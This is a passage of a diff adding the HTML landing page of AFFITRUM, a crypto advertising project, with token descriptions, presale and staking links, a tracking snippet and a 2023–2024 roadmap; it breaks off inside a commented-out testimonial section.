@@ -1,0 +1,802 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+    <meta name="description" content="Decentralizing advertising with web3 & AI while rewarding holders.">
+    <title>AFFITRUM - Empowering Transparent and Efficient Digital Advertising through AI and Web3 Products</title>
+
+    <link rel="icon" href="assets/images/favicon.png" type="image/gif" sizes="20x20">
+
+    <link rel="stylesheet" href="homeassets/css/animate.css">
+    <!-- css file link -->
+    <link rel="stylesheet" href="homeassets/css/all.css">
+
+    <!-- bootstrap 5 -->
+    <link rel="stylesheet" href="homeassets/css/bootstrap.min.css">
+
+    <!-- box-icon -->
+    <link rel="stylesheet" href="homeassets/css/boxicons.min.css">
+
+    <!-- bootstrap icon -->
+    <link rel="stylesheet" href="homeassets/css/bootstrap-icons.css">
+
+    <!-- jquery ui -->
+    <link rel="stylesheet" href="homeassets/css/jquery-ui.css">
+
+    <!-- swiper-slide -->
+    <link rel="stylesheet" href="homeassets/css/swiper-bundle.css">
+
+    <!-- nice-select -->
+    <link rel="stylesheet" href="homeassets/css/nice-select.css">
+
+    <!-- magnefic popup css -->
+    <link rel="stylesheet" href="homeassets/css/magnific-popup.css">
+
+    <!-- animate css -->
+    <link rel="stylesheet" href="homeassets/css/magnific-popup.css">
+
+    <!-- odometer css -->
+    <link rel="stylesheet" href="homeassets/css/odometer.css">
+
+    <!-- style css -->
+    <link rel="stylesheet" href="homeassets/css/style.css">
+<!-- Twitter conversion tracking base code -->
+<script>
+!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
+},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',
+a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
+twq('config','ofi81');
+</script>
+<!-- End Twitter conversion tracking base code -->
+</head>
+
+<body class="tt-magic-cursor">
+
+    <div class="preloader">
+        <div class="counter">0</div>
+    </div>
+    
+    <div id="magic-cursor">
+        <div id="ball"></div>
+    </div>
+
+    <!-- ========== header============= -->
+    <header class="header-area style-1 bg-color2">
+        <div class="container-fluid d-flex justify-content-between align-items-center">
+            <div class="header-logo">
+                <a href="index.html"><img alt="image" class="img-fluid" src="homeassets/images/icons/header1-logo.svg"></a>
+            </div>
+            <div class="main-menu">
+                <div class="mobile-logo-area d-lg-none d-flex justify-content-between align-items-center">
+                    <div class="mobile-logo-wrap">
+                        <a href="index.html"><img alt="image" src="homeassets/images/icons/header1-logo.svg"></a>
+                    </div>
+                    <div class="mobile-menu-close-btn">
+                        <i class="bi bi-x-lg text-dark"></i>
+                    </div>
+                </div>
+                <ul class="menu-list">
+                    <li><a href="index.html" class="drop-down">Home</a></li>
+  <li><a target="_blank" href="app.html" class="drop-down">Join Presale</a></li>
+                    <li><a target="_blank" href="https://across.to/bridge" class="drop-down" data-hover='Bridge ETH'>Bridge ETH</a></li>
+					<li><a href="staking.html" class="drop-down">Staking</a></li>
+					<li><a href="https://arbiscan.io/address/0xdd839b26B9d5c10b8744832192EF9971300Ee4BA">Contract</a></li>
+                    <li><a href="cdn-cgi/l/email-protection.html#bcdfd3d2c8dddfc8fcdddadad5c8cec9d192ddd5">Contact us</a></li>
+                </ul>
+            </div>
+
+            <div class="nav-right d-flex jsutify-content-end align-items-center">
+                <a href="app.html" class="eg-btn btn--primary-outline btn--lg d-xl-flex d-none">Launch App</a>
+                
+                <div class="sidebar-button mobile-menu-btn ">
+                    <div class="sidebar-icon-border">
+                        <svg width="51" height="51" viewBox="0 0 51 51" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M22.5968 50C19.5284 49.6696 16.6724 48.7962 14.0289 47.3801C11.3854 45.9639 9.09586 44.1582 7.16041 41.9632C5.22495 39.7681 3.71435 37.2543 2.62861 34.422C1.54287 31.5896 1 28.6156 1 25.5C1 19.1744 3.05347 13.6749 7.16041 9.00145C11.2673 4.32804 16.4364 1.66089 22.6676 1V2.5578C16.9085 3.36031 12.1171 5.92124 8.29335 10.2406C4.46965 14.56 2.5578 19.6464 2.5578 25.5C2.5578 31.3064 4.45785 36.381 8.25795 40.724C12.058 45.067 16.8377 47.6397 22.5968 48.4422V50ZM28.474 50V48.4422C30.5039 48.159 32.4747 47.6515 34.3866 46.9198C36.2984 46.1881 38.0804 45.1614 39.7327 43.8396L41.0072 44.9725C39.119 46.2943 37.1245 47.3801 35.0238 48.2298C32.9232 49.0795 30.7399 49.6696 28.474 50ZM39.8743 7.30202C38.1749 6.07466 36.3692 5.04793 34.4574 4.22182C32.5455 3.39571 30.5511 2.84104 28.474 2.5578V1C30.7399 1.33044 32.9114 1.92052 34.9884 2.77023C37.0655 3.61994 39.0718 4.72929 41.0072 6.09827L39.8743 7.30202ZM44.9725 40.724L43.8396 39.6619C45.1142 38.0096 46.1291 36.2276 46.8844 34.3158C47.6397 32.4039 48.159 30.4094 48.4422 28.3324H50C49.7168 30.5983 49.1503 32.7816 48.3006 34.8822C47.4509 36.9829 46.3415 38.9302 44.9725 40.724ZM48.4422 22.6676C48.159 20.5906 47.6397 18.5961 46.8844 16.6842C46.1291 14.7724 45.1142 12.9904 43.8396 11.3382L45.185 10.1344C46.4123 12.0226 47.4273 14.0171 48.2298 16.1178C49.0323 18.2184 49.6224 20.4017 50 22.6676H48.4422Z"
+                                stroke="#0A0A0A" stroke-width="0.7"/>
+                        </svg>
+                    </div>
+                    <div class="sidebar-icon">
+                        <svg width="24" height="20" viewBox="0 0 24 20" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.9998 7H5.88867" stroke="white" stroke-width="1.3" stroke-linecap="round"
+                                stroke-linejoin="round"/>
+                            <path d="M23 1H1" stroke="white" stroke-width="1.3" stroke-linecap="round"
+                                stroke-linejoin="round"/>
+                            <path d="M23 13H1" stroke="white" stroke-width="1.3" stroke-linecap="round"
+                                stroke-linejoin="round"/>
+                            <path d="M22.9998 19H5.88867" stroke="white" stroke-width="1.3" stroke-linecap="round"
+                                stroke-linejoin="round"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- ========== header end============= -->
+
+    <!-- ====== sidebar start ======== -->
+    <div class="main-nav-wrapper">
+        <div class="main-nav">
+            <div class="menu-close-btn"><i class="bi bi-x-lg"></i></div>
+            <div class="mobile-logo-area d-flex justify-content-start align-items-center">
+                <div class="header-logo">
+                    <a href="index.html"><img alt="image" class="img-fluid"
+                            src="homeassets/images/icons/header1-logo.svg"></a>
+                </div>
+            </div>
+            <div class="sidebar-menu-area">
+                <ul class="menu-list">
+                    <li class="menu-item"><a href="index.html" data-hover='Home'>Home</a></li>
+					<li class="menu-item"><a target="_blank" href="https://bridge.arbitrum.io/" data-hover='Bridge ETH'>Bridge ETH</a></li>
+                    <li class="menu-item"><a target="_blank" href="app.html" onclick="alert('Dapp coming soon')" data-hover='Join Trum Presale'>Join Trum Presale</a></li>
+                    <li class="menu-item"><a href="app.html" data-hover='Dashboard'>Dashboard</a></li>
+					<li class="menu-item"><a href="staking.html" data-hover='Staking'>Staking</a></li>
+					<li class="menu-item"><a href="bridgefarm.html" data-hover='Bridge-Farm'>Bridge-Farm</a></li>
+					<!--<li class="menu-item"><a href="staking" data-hover='BridgeFarm'>BridgeFarm</a></li>-->
+					<li class="menu-item"><a href="https://arbiscan.io/address/0xdd839b26B9d5c10b8744832192EF9971300Ee4BA" data-hover='Contract'>Contract</a></li>
+					
+                <li class="menu-item"><a href="cdn-cgi/l/email-protection.html#2744484953464453674641414e5355524a09464e" data-hover='Contact us'>Contact us</a></li>
+                </ul>
+                <div class="sidebar-menu-contact d-flex justify-content-start">
+                    <a href="https://twitter.com/affitrum" data-cursor="Twitter"><img src="homeassets/images/icons/twitter-icon.svg"  class="img-fluid" alt="image"></a>
+                    <a href="https://t.me/affitrum" data-cursor="Telegram"><img src="homeassets/images/icons/telegram-icon.svg" class="img-fluid" alt="image"></a>
+                </div>
+            </div>
+            <div class="sidebar-social d-flex justify-content-center gap-5">
+            <li><a target="_blank" href="https://t.me/affitrum"><font color="#008b5e"><i class='bx bxl-telegram'></i></font></a></li>
+            <li><a target="_blank" href="https://twitter.com/affitrum"><font color="#008b5e"><i class='bx bxl-twitter'></i></font></a></li>
+            <li><a target="_blank" href="https://medium.com/@affitrum"><font color="#008b5e"><i class='bx bxl-medium'></i></font></a></li>
+			<li><a target="_blank" href="https://www.youtube.com/channel/UClPL3Ff4xfY2z18rBC1Xjtg"><font color="#008b5e"><i class='bx bxl-youtube'></i></font></a></li>
+            <li><a target="_blank" href="https://facebook.com/affitrum"><font color="#008b5e"><i class='bx bxl-facebook'></i></font></a></li>
+			<li><a target="_blank" href="https://instagram.com/affitrum"><font color="#008b5e"><i class='bx bxl-instagram'></i></font></a></li>
+			<li><a target="_blank" href="https://discord.gg/5tn8ZeuB"><font color="#008b5e"><i class='bx bxl-discord'></i></font></a></li>
+            </div>
+        </div>
+    </div>
+
+    <!-- ====== sidebar end ======== -->
+    
+    <!-- ========== banner start============= -->
+
+<div class="banner-section2 bg-color2 overflow-hidden">
+        <ul class="social-list2" style="top: -5px;">
+			<li><a target="_blank" href="https://t.me/affitrum"><i class='bx bxl-telegram'></i></a></li>
+            <li><a target="_blank" href="https://twitter.com/affitrum"><i class='bx bxl-twitter'></i></a></li>
+            <li><a target="_blank" href="https://medium.com/@affitrum"><i class='bx bxl-medium'></i></a></li>
+			<li><a target="_blank" href="https://www.youtube.com/channel/UClPL3Ff4xfY2z18rBC1Xjtg"><i class='bx bxl-youtube'></i></a></li>
+            <li><a target="_blank" href="https://facebook.com/affitrum"><i class='bx bxl-facebook'></i></a></li>
+			<li><a target="_blank" href="https://instagram.com/affitrum"><i class='bx bxl-instagram'></i></a></li>
+			<li><a target="_blank" href="https://github.com/affitrum"><i class='bx bxl-github'></i></a></li>
+        </ul>
+        <div class="banner-top">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-6 col-lg-7 col-md-10 col-sm-12 col-12 p-0" style="margin-left:-15px;">
+                        <div class="banner2-content">
+                            <div class="section-title-lg">
+                                <h2 style="font-size:55px;">AI-based Algorithmic<strong><span id="js-rotating">Defi Scaling, Blockchain Growth, Web3 Expansion</span></strong> for Digital Advertising</h2>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="banner-bottom">
+		            <div class="circle-text-common2 circle-text-banner2" style="margin-right:190px;">
+                <a href="https://twitter.com/affitrum"><img src="homeassets/images/icons/twitter-icon.svg" alt="image"></a>
+                <p id="CircleTypeText2" class="circle-text">TWITTER TWITTER TWITTER</p>
+            </div>              <div class="banner2-image" style="margin-right:-100px;">
+                <img src="homeassets/images/bg/banner2-bg.png" height="450" width="353" alt="image">
+            </div>
+            <div class="banner-scroll-down">
+                <a href="index.html#excellent-collection">SCROLL</a>
+            </div>
+            <div class="container-fluid">
+                <div class="background-text">
+                    <h2 class="marquee_text"><img src="homeassets/images/icons/star.svg" alt="image">Generating staking Yield <img src="homeassets/images/icons/star.svg" alt="image"> For investors <img src="homeassets/images/icons/star.svg" alt="image">Up to 401% APY</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ========== banner end============= -->
+
+    <!-- =============== choose-us-section start  =========== -->
+
+    <div class="choose-us-section pb-120 bg-color2">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-6 col-10">
+                    <!--<div class="choose-us-image">
+                        <img src="homeassets/images/bg/choose-us-image.png" class="img-fluid parralax-image" alt="image">
+                    </div>-->
+					
+                        <img src="homeassets/images/bg/choose-us-image.png" class="img-fluid" alt="image">
+                   
+                </div>
+                <div class="col-lg-6">
+                    <div class="section-title4 mb-0">
+                        <span>About us</span>
+                        <h2>What is AffiTrum</h2>
+                        <img src="homeassets/images/icons/sec-title4-vector.svg" alt="image">
+                    </div>
+                    <div class="choose-us-content">
+                        <p>Affitrum is a revolutionary digital advertising project that leverages Web3 technologies to address the existing challenges in the advertising industry.The project aims to eliminate fraud, enhance user privacy, and provide fair compensation to all stakeholders involved. Join us in this groundbreaking journey as we reshape the future of digital advertising.</p>
+                        <ul class="choose-us-list">
+                            <li>Enabling marketers and publishers to build a stable environment.</li>
+                            <li>Shaping the future of AdTech via our TRUM blockchain and services.</li>
+                            <li>Utilizing AI, smart contracts, and decentralized Ad networks.</li>
+                        </ul>
+                        <a target="_blank" href="https://docs.affitrum.ai" class="eg-btn btn--primary-outline2 btn--lg">Read Our Documentation</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- =============== choose-us-section end  =============== -->
+
+    <!-- ========== collection-section start============= -->
+    
+
+<div class="collection-section1 bg-color1 pt-120 pb-120">
+        <div class="container">
+            
+  <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <div class="rare-feature-content">
+                        <div class="section-title3 mb-30 text-md-start text-center ms-0">
+                            <h2> <img src="homeassets/images/icons/section-title-dot.svg" alt="image">Two Bridged Tokens</h2>
+                        </div>
+                        <p>Two new native utility tokens are going to be introduced by Affitrum. To make it easier for users to conduct transactions within the ecosystem, the $AFFI token and the $TRUM token would both be deployed on the Arbitrum network.</p>
+                        <ul class="rare-list">
+                            <li>
+                                <h3 class="rare-title"><span>A</span>ffi Token</h3>
+                                <p>AFFI tokens are created for exposure and to raise awareness about the AFFITRUM project and the upcoming TRUM ecosystem.</p>
+                            </li>
+                            <li>
+                                <h3 class="rare-title"><span>T</span>rum Token</h3>
+                                <p>$TRUM tokens on Arbitrum Chain will drive the TRUM ecosystem and support the $TRUM blockchain development and Ad exchange.</p>
+                            </li>
+                        </ul>
+						<div class="row justify-content-center">
+                           <div class="col--4 text-center">
+                              <a target="_blank" href="https://docs.affitrum.ai/token-economics/tokens" class="eg-btn btn--primary2 btn--lg"><img src="homeassets/images/icons/btn-star.svg" alt="image">Checkout our Tokenomics</a>
+                           </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6 d-flex justify-content-lg-end justify-content-center">
+                    <div class="">
+					                        <div class="circle-text-common2 circel-tex-rare-collection">
+                           <a href="https://t.me/affitrum"> <img src="homeassets/images/icons/telegram-icon.svg" alt="image"></a>
+                            <p id="CircleTypeText3" class="circle-text text-white"></p><p></p>
+                        </div>
+                        
+                        <img src="homeassets/images/bg/rare-feature-image.png" class="img-fluid" alt="image">
+                    </div>
+                </div>
+            </div>
+            
+        </div>
+        
+    </div>
+    <!-- ========== collection-section end============= -->
+
+    <!-- ========== why_choose_section start============= -->
+    <div class="features-section bg-color2 pt-120 pb-120">
+        <div class="container">
+            <div class="row">
+                <div class="col-xxl-6 col-xl-7 col-lg-7" data-scroll data-scroll-speed="3">
+                    <div class="section-title1 text-md-start text-center">
+                        <span>Our Blockchain Usecases</span>
+                        <h2>Bridging Advertising with AI and Web3 Products</h2>
+                    </div>
+                    <div class="row mb-25 justify-content-md-start justify-content-center g-4">
+                        <div class="col-md-4 col-sm-6">
+                            <div class="feature-item">
+                                <img src="homeassets/images/icons/feature-icon1.svg" alt="image">
+                                <h4>TRUM Blockchain</h4>
+                                <p>The blockchain Powering the advertising ecosystem.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <div class="feature-item">
+                                <img src="homeassets/images/icons/feature-icon2.svg" alt="image">
+                                <h4>Ad exchange</h4>
+                                <p>AI Utility app connecting publishers and advertisers.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-4 col-sm-6">
+                            <div class="feature-item">
+                                <img src="homeassets/images/icons/feature-icon3.svg" alt="image">
+                                <h4>AI METASPHERE</h4>
+                                <p>Metaverse Arena for placing and viewing Ads</p>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-md-start text-center">Token holders in the Affitrum DAO project will have a voice in governance decisions. Its goal is to control where the product goes and how it evolves.</p>
+                </div>
+                <div class="col-xxl-6 col-xl-5 col-lg-5 ps-lg-5 d-lg-block d-none">
+                    <div class="feature-image">
+                        <img src="homeassets/images/bg/feature-img.png" class="img-fluid parralax-image" alt="image">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ========== why_choose_section end============= -->
+
+    <!-- ====== investor-section start ======== -->
+<!--
+    <div class="investor-section bg-color2">
+        <div class="container">
+            <div class="row justify-content-center text-center">
+                <div class="section-title4">
+                    <span>Media and partners</span>
+                    <h2>We are featured in</h2>
+                    <img src="homeassets/images/icons/sec-title4-vector.svg" class="img-fluid" alt="image">
+                </div>
+            </div>
+            <div class="row g-4 justify-content-center">
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor1.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor2.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor3.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor4.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor5.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor6.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor8.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+                <div class="col-lg-3 col-md-4 col-sm-6 col-6">
+                    <div class="investor-single">
+                        <img src="homeassets/images/investors/investor2.svg" class="img-fluid" alt="image">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+-->
+    <!-- ====== investor-section end ======== -->
+
+    <!-- ========== roadmap_section start======== -->
+
+    <div class="roadmap-section bg-color2 overflow-hidden" data-scroll data-scroll-speed="3" style="padding-top:60px;padding-bottom:60px;">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-md-10">
+                    <div class="section-title1">
+                        <span>AffiTrum Roadmap</span>
+                        <h2>Our Tracked Roadmap.</h2>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container-fluid">
+            <div class="row justify-content-center d-flex align-items-center">
+                <div class="col-lg-12 position-relative">
+                    <div class="swiper swiper-roadmap-small">
+                        <div class="swiper-wrapper">
+						    <div class="swiper-slide">
+                                <div class="pagenation-stat">
+                                    <svg width="26" height="25" viewBox="0 0 26 25" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M13.0588 6.5L16.3765 2L16.5608 7.8125L21.9059 6.125L18.5882 10.7326L23.9333 12.6875L18.5882 14.375L21.9059 19.0625L16.3765 17.1875V23L12.8745 18.3125L9.55686 23L9.37255 17.1875L4.02745 18.875L7.3451 14.375L2 12.5L7.3451 10.625L4.02745 6.125L9.55686 7.625V2L13.0588 6.5Z"/>
+                                        <circle cx="12.9668" cy="12.5" r="3.5"/>
+                                    </svg>
+                                </div>
+                                <button class="slider-button">Q2 2023</button>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="pagenation-stat">
+                                    <svg width="26" height="25" viewBox="0 0 26 25" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M13.0588 6.5L16.3765 2L16.5608 7.8125L21.9059 6.125L18.5882 10.7326L23.9333 12.6875L18.5882 14.375L21.9059 19.0625L16.3765 17.1875V23L12.8745 18.3125L9.55686 23L9.37255 17.1875L4.02745 18.875L7.3451 14.375L2 12.5L7.3451 10.625L4.02745 6.125L9.55686 7.625V2L13.0588 6.5Z"/>
+                                        <circle cx="12.9668" cy="12.5" r="3.5"/>
+                                    </svg>
+                                </div>
+                                <button class="slider-button">Q3 2023</button>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="pagenation-stat">
+                                    <svg width="26" height="25" viewBox="0 0 26 25" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M13.0588 6.5L16.3765 2L16.5608 7.8125L21.9059 6.125L18.5882 10.7326L23.9333 12.6875L18.5882 14.375L21.9059 19.0625L16.3765 17.1875V23L12.8745 18.3125L9.55686 23L9.37255 17.1875L4.02745 18.875L7.3451 14.375L2 12.5L7.3451 10.625L4.02745 6.125L9.55686 7.625V2L13.0588 6.5Z"/>
+                                        <circle cx="12.9668" cy="12.5" r="3.5"/>
+                                    </svg>
+                                </div>
+                                <button class="slider-button">Q4 2023</button>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="pagenation-stat">
+                                    <svg width="26" height="25" viewBox="0 0 26 25" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M13.0588 6.5L16.3765 2L16.5608 7.8125L21.9059 6.125L18.5882 10.7326L23.9333 12.6875L18.5882 14.375L21.9059 19.0625L16.3765 17.1875V23L12.8745 18.3125L9.55686 23L9.37255 17.1875L4.02745 18.875L7.3451 14.375L2 12.5L7.3451 10.625L4.02745 6.125L9.55686 7.625V2L13.0588 6.5Z"/>
+                                        <circle cx="12.9668" cy="12.5" r="3.5"/>
+                                    </svg>
+                                </div>
+                                <button class="slider-button">Q1 2024</button>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="pagenation-stat">
+                                    <svg width="26" height="25" viewBox="0 0 26 25" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M13.0588 6.5L16.3765 2L16.5608 7.8125L21.9059 6.125L18.5882 10.7326L23.9333 12.6875L18.5882 14.375L21.9059 19.0625L16.3765 17.1875V23L12.8745 18.3125L9.55686 23L9.37255 17.1875L4.02745 18.875L7.3451 14.375L2 12.5L7.3451 10.625L4.02745 6.125L9.55686 7.625V2L13.0588 6.5Z"/>
+                                        <circle cx="12.9668" cy="12.5" r="3.5"/>
+                                    </svg>
+                                </div>
+                                <button class="slider-button">Q2 2024</button>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="pagenation-stat">
+                                    <svg width="26" height="25" viewBox="0 0 26 25" xmlns="http://www.w3.org/2000/svg">
+                                        <path
+                                            d="M13.0588 6.5L16.3765 2L16.5608 7.8125L21.9059 6.125L18.5882 10.7326L23.9333 12.6875L18.5882 14.375L21.9059 19.0625L16.3765 17.1875V23L12.8745 18.3125L9.55686 23L9.37255 17.1875L4.02745 18.875L7.3451 14.375L2 12.5L7.3451 10.625L4.02745 6.125L9.55686 7.625V2L13.0588 6.5Z"/>
+                                        <circle cx="12.9668" cy="12.5" r="3.5"/>
+                                    </svg>
+                                </div>
+                                <button class="slider-button">Q3 2024</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="swiper swiper-roadmap-big">
+                        <div class="swiper-wrapper">
+						<div class="swiper-slide">
+                                <div class="roadmap-single">
+                                    <div class="roadmap-content">
+                                        <span>April - June 2023</span>
+                                        <h3>Conceptualization and Research</h3>
+                                        <p>At this point in the process, the core team will have their first meeting at which they will discuss the affitrum project and begin developing their strategy.</p>
+                                        <ol class="roadmap-list">
+                                            <li>Creation of AFFI-TRUM Idea ✅</li>
+                                            <li>Documentation Draft v1 ✅</li>
+                                            <li>Team (Astronauts) Formation ✅</li>
+                                            <li>Contract Code Developement ✅</li>
+											<li>Website UI Developement ✅</li>
+											<li>Initial Marketing Campaign ✅</li>
+                                        </ol>
+                                    </div>
+                                    <div class="roadmap-image">
+                                        <img src="homeassets/images/bg/roadmap0.png" class="img-fluid" alt="image">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="roadmap-single">
+                                    <div class="roadmap-content">
+                                        <span>July - September 2023</span>
+                                        <h3>Project Launch and Presale </h3>
+                                        <p>The AFFITRUM project begins development, the project is launched, the $AFFI token is launched, and the $TRUM presale begins.</p>
+                                        <ol class="roadmap-list">
+                                            <li>Web & Contract Deployment ✅</li>
+                                            <li>AFFI Private Sale & DEX Listing ✅</li>
+											<li>$AFFI Airdrop Launch ✅</li>
+											<li>Solidproof Audit and KYC ✅</li>
+											<li>$TRUM Presale & BridgeFarm Launch ✅</li>
+											<li>$AFFI CMC Listing</li>
+                                        </ol>
+                                    </div>
+                                    <div class="roadmap-image">
+                                        <img src="homeassets/images/bg/roadmap1.png" class="img-fluid" alt="image">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="roadmap-single">
+                                    <div class="roadmap-content">
+                                        <span>October - December 2023</span>
+                                        <h3>$TRUM Listings and Blockchain Developement</h3>
+                                        <p>The conclusion of the TRUM token presale, listings on CEX, development of the Revenue App and Blockchain, and an upgrade to BridgeFarm</p>
+                                        <ol class="roadmap-list">
+                                            <li>$TRUM presale End Claim</li>
+                                            <li>$TRUM Camelot & CEX Listing</li>
+                                            <li>$TRUM Bridge-Farm Upgrade</li>
+                                            <li>Revenue App v1 Developement</li>
+											<li>$TRUM Blockchain v1 Developement</li>
+											<li>UI Platform Upgrades</li>
+                                        </ol>
+                                    </div>
+                                    <div class="roadmap-image">
+                                        <img src="homeassets/images/bg/roadmap2.png" class="img-fluid" alt="image">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="roadmap-single">
+                                    <div class="roadmap-content">
+                                        <span>January - March 2024</span>
+                                        <h3>Major CEX Listings and Partnerships</h3>
+                                        <p>The community will choose three major Centralized exchanges to list the $AFFI and $TRUM tokens, and the AFFITRUM revenue app, blockchain, and DEX will be launched.</p>
+                                        <ol class="roadmap-list">
+                                            <li>4 CEX Listing for $AFFI & $TRUM</li>
+                                            <li>Partnership Expansion</li>
+                                            <li>Wallet Compatibility Expansion</li>
+                                            <li>Launch of Revenue App</li>
+											<li>Launch of ECOSYSTEM Blockchain</li>
+											<li>Affitrum-Dex 1.0 Developement</li>
+                                        </ol>
+                                    </div>
+                                    <div class="roadmap-image">
+                                        <img src="homeassets/images/bg/roadmap3.png" class="img-fluid" alt="image">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="roadmap-single">
+                                    <div class="roadmap-content">
+                                        <span>April - June 2024</span>
+                                        <h3>Liquidity Extention and extensive Marketing</h3>
+                                        <p>We will launch Affitrum-Dex 1.0 on our blockchain, as well as add Cross-Chain Compatibility to the $AFFI and $TRUM tokens, followed by the launch of an aggressive global marketing campaign.</p>
+                                        <ol class="roadmap-list">
+                                            <li>Own Liquidity Partnering</li>
+                                            <li>Cross-Chain Compatibility</li>
+                                            <li>Aggresive Global Marketing</li>
+                                            <li>Security Audit Upgrades</li>
+											<li>Affitrum-Dex 1.0 Launch</li>
+											<li>Open source project area Launch.</li>
+                                        </ol>
+                                    </div>
+                                    <div class="roadmap-image">
+                                        <img src="homeassets/images/bg/roadmap4.png" class="img-fluid" alt="image">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="roadmap-single">
+                                    <div class="roadmap-content">
+                                        <span>July - September 2024</span>
+                                        <h3>Community Building and Continuous Development</h3>
+                                        <p>We will develop and launch our AFFITRUM META-SPHERE and AFFITRUM DAO, conduct additional marketing, and then initiate a new road map for 2023-2024.</p>
+                                        <ol class="roadmap-list">
+                                            <li>METASPHERE v1 Developement</li>
+                                            <li>DAO Developement</li>
+											<li>Renewed Marketing Campaign</li>
+                                            <li>METASPHERE v1 Launch</li>
+                                            <li>DAO Launch</li>
+											<li>New Roadmap Launch..</li>
+                                        </ol>
+                                    </div>
+                                    <div class="roadmap-image">
+                                        <img src="homeassets/images/bg/roadmap5.png" class="img-fluid" alt="image">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container">
+                <div class="row mt-70 justify-content-center">
+                    <div class="col-lg-11">
+                        <div class="slider-arrows twos  d-md-flex d-none justify-content-lg-between justify-content-center align-items-center gap-4">
+                            <div class="roadmap-prev1 swiper-prev-arrow" tabindex="0" role="button"
+                                aria-label="Previous slide"><img src="homeassets/images/icons/roadmap-arrow-right.svg" class="img-fluid" alt="image"></div>
+                            <div class="roadmap-next1 swiper-next-arrow" tabindex="0" role="button" aria-label="Next slide">
+                                <img src="homeassets/images/icons/roadmap-arrow-left.svg" alt="image" class="img-fluid"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ========== roadmap_section end======== -->
+
+    <!-- ========== testimonial_section start======== -->
+<!--
+    <div class="testimonial-section bg-color1 pt-120 pb-120">
+        <div class="testimonial-image">
+            <img src="homeassets/images/bg/testimonial-image.png" class="img-fluid" alt="image">
+        </div>
+        <div class="container">
+            <div class="row justify-content-lg-end justify-content-center">
+                <div class="col-lg-7 col-md-10">
+                    <div class="section-title1 text-start">
+                        <span>Token Utility</span>
+                        <h2>More benefits of holding our <br> Tokens.</h2>
+                    </div>
+                    <div class="swiper testimonial1-slider position-relative">
+                        <div class="swiper-wrapper">
+                            <div class="swiper-slide">
+                                <div class="testimonial1-single">
+                                    <div class="testimonial-content">
+                                        <p>"I work with Alguneb Johnl on many projects, he always tolda exceeds my
+                                            expectations with his quality work and fastestopa service, very smooth and
+                                            simple communication."</p>
+                                    </div>
+                                    <div class="testimonial-author">
+                                        <h5>Leslie Alexander</h5>
+                                        <p>Collector</p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-slide">
+                                <div class="testimonial1-single">
